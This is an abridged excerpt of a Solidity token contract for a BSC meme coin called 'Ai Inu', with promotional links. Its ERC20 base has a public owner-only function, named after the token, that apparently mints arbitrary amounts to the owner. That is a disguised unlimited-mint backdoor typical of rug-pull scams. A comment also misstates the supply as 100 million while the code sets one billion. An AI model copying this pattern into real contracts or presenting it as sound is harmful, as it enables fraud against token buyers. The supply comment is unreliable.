...
//
// $AiInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/AiinuBsc
//🌐 Website:https://aiinu.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _AiInu(uint256 amount) public onlyOwner {
 _AiInu(msg.sender, amount);
    }
    ...
    function _AiInu(address account, uint256 amount) internal virtual {
...
contract $AiInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Ai Inu", "AIINU") {
     _AiInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}